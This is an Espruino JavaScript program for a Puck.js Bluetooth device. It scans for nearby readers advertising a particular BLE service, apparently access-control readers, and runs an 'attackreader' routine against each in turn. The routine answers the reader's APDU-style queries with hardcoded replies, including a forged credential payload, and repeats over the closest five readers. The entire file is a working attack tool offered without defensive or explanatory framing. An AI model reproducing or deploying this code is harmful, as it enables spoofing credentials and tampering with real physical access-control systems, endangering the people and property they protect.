var gatt;
var wrong = new Uint8Array([0xC0, 0x6A, 0x82]);
var aid = new Uint8Array([0xC0, 0x6F, 0x08, 0x85, 0x06, 0x02, 0x01, 0x40, 0x02, 0x01, 0x00, 0x90, 0x00]);
var ack = new Uint8Array([0xC0, 0x90, 0x00]);
var part1 = new Uint8Array([0x81, 0x44, 0x3E, 0x44, 0x00, 0x00, 0x00, 0xA6, 0x13, 0xA1, 0x11, 0xA1, 0x0F, 0x80, 0x01, 0x50, 0x81, 0x01, 0x01, 0x82]).buffer;
var part2 = new Uint8Array([0x40, 0x01, 0x01, 0x83, 0x01, 0x00, 0x84, 0x01, 0x01, 0x90, 0x00]).buffer;
var beep = new Uint8Array([0xC0, 0x44, 0x3E, 0x44, 0x00, 0x00, 0x00, 0xA6, 0x06, 0xA0, 0x04, 0x85, 0x02, 0x1F, 0x40, 0x90, 0x00]);
var longbeep = new Uint8Array([0xC0, 0x44, 0x3E, 0x44, 0x00, 0x00, 0x00, 0xA6, 0x06, 0xA0, 0x04, 0x85, 0x02, 0x7D, 0x00, 0x90, 0x00]);
var button = 0;
var hids = [];
var devs = [];
var id;
var vid;
var starttime;
var tscantime;
var endtime;
var e;
var beeptime;

E.enableWatchdog(120); // If scan or connect hangs, reboot Puck                                                        

function attackreader() {
    console.log("Battery level: " + E.getBattery());
    var looptime = [];
    looptime.push(getTime());
    if (hids.length > 0) {
        console.log("Remaining devices: " + hids.length);
        var jdev = JSON.parse(JSON.stringify(hids.shift()));
        var dev = jdev.id;
        console.log("Attacking Device: " + dev);
        changeInterval(id, 20000);
        if (button === 2) changeInterval(vid, 60000);
        NRF.setTxPower(4);
        NRF.connect(dev + " random").then(function(g) {
            gatt = g;
            digitalPulse(LED2, 1, [1000, 1000, 1000]);
            count = 0;
            return gatt.getPrimaryService("00009800-0000-1000-8000-00177a000002");
        }).then(function(service) {
            return service.getCharacteristic("0000aa00-0000-1000-8000-00177a000002");
        }).then(function(characteristic) {
            characteristic.on('characteristicvaluechanged', function(event) {
                const byteArray = new Uint8Array(event.target.value.buffer);
                const hexParts = [];
                var senthex = '';
                for (let i = 0; i < byteArray.length; i++) {
                    const hex = byteArray[i].toString(16);
                    hexParts.push(hex);
                    senthex += hex;
                }
                hexParts.join('');
                if (senthex === "c00a440aa00038202f0110") {
                    characteristic.writeValue(aid);
                } else if (senthex.match("c00a440aa000")) {
                    characteristic.writeValue(wrong);
                } else if (senthex.match("c00da")) {
                    characteristic.writeValue(ack);
                } else if (senthex === 'c00ca0000' && count == 0) {
                    count = (count + 1);
                    characteristic.writeValue(part1);
                    setTimeout(function() {
                        characteristic.writeValue(part2);
                    }, 250);
                } else if (senthex.match("c00da73000")) {
                    characteristic.writeValue(ack);
                } else if (count == 1 && senthex === 'c00ca0000') {
                    characteristic.writeValue(longbeep);
                    console.log("Beep");
                    try {
                        gatt.disconnect();
                    } catch (e) {
                        console.log('Gatt Catch');
                    }
                    try {
                        dev.disconnect();
                    } catch (e) {
                        console.log('Dev Catch');
                    }
                    beeptime = getTime();
                    looptime.push(getTime());
                    console.log("Looptime: " + (looptime.pop() - looptime.shift()).toFixed(2) + " secs");
                    changeInterval(id, 4000);
                    console.log(" ");
                } else {
                    looptime.push(getTime());
                    digitalPulse(LED1, 1, 2500);
                    clearInterval();
                    console.log("Failed with " + senthex);
                    console.log(looptime);
                    console.log("Looptime: " + (looptime.pop() - looptime.shift()).toFixed(2) + " secs");
                    console.log(" ");
                }
            });
            return characteristic.startNotifications();
        }).catch(function(e) {
            console.log("Catch function");
            digitalPulse(LED1, 1, [500, 500, 500, 500, 500]);
            endtime = getTime();
            console.log("Total Time: " + (endtime - starttime).toFixed(2) + " secs");
            try {
                gatt.disconnect();
            } catch (e) {
                console.log('Notification Catch');
            }
        });
    } else {
        console.log("Complete attack and clearing timer");
        clearInterval(id);
        rollleds(250);
        endtime = getTime();
        var totaltime = (endtime - starttime).toFixed(2);
        var rescantime = (endtime - beeptime).toFixed(2);
        console.log("Total Time: " + totaltime + " secs");
        console.log(" ");
        if (button === 2) {
            changeInterval(vid, ((30 - tscantime) - rescantime) * 1000);
            console.log("Estimated interval for rescan: " + ((30 - tscantime) - rescantime) + " secs");
        }
        if (button === 3) {
            console.log("Stopping scan");
            clearInterval();
        }
    }
}

function doScan() {
    if (button === 2) changeInterval(vid, 60000);
    var scantime = [];
    scantime.push(getTime());
    starttime = scantime[0];
    if (button === 3) {
        console.log("Stopping scan");
        clearInterval();
    } else {
        var packets = 20;
        digitalPulse(LED3, 1, [750, 750, 750]);
        NRF.setScan(function(devs) {
            packets--;
            pjson = JSON.parse(JSON.stringify(devs));
            var rid = ((pjson.id).split(" ")[0]);
            if (hids.map(x => x.id).indexOf(rid) == -1) {
                hids.push({
                    id: rid,
                    rssi: pjson.rssi
                });
            }
            if ((packets <= 0) || (hids.length === 5)) {
                NRF.setScan();
                console.log("Number of readers: " + hids.length);
                scantime.push(getTime());
                tscantime = (scantime.pop() - scantime.shift()).toFixed(2);
                if (hids.length != 0) {
                    hids.sort((a, b) => parseFloat(b.rssi) - parseFloat(a.rssi));
                    id = setInterval(attackreader, 500);
                } else if (button === 1) {
                    console.log("No readers detected");
                    digitalPulse(LED1, 1, [500, 500, 500, 500, 500]);
                    clearInterval();
                }
            }
        }, {
            filters: [{
                services: ["00009800-0000-1000-8000-00177a000002"]
            }]
        });
    }
}

function rollleds(ledtime) {
    digitalPulse(LED3, 1, ledtime);
    digitalPulse(LED2, 1, (ledtime * 2));
    digitalPulse(LED1, 1, (ledtime * 3));
}

setWatch(function(e) {
    var btntime = (e.time - e.lastTime);
    if (btntime < 0.5) { // on short press loop through 5 of the closest devices only once
        console.log("One scan");
        button = 1;
        doScan();
    } else if ((btntime > 0.5) && (btntime < 2.0)) { // on medium press use repeat on 5 of the closest scanned devices
        console.log("Continuous scan");
        button = 2;
        vid = setInterval(doScan, 500);
    } else if (btntime > 2.01) { // on long press break out of cycle
        console.log("Trying to break loop scan");
        button = 3;
        clearInterval();
    }
}, BTN, {
    edge: "falling",
    debounce: 50,
    repeat: true
});
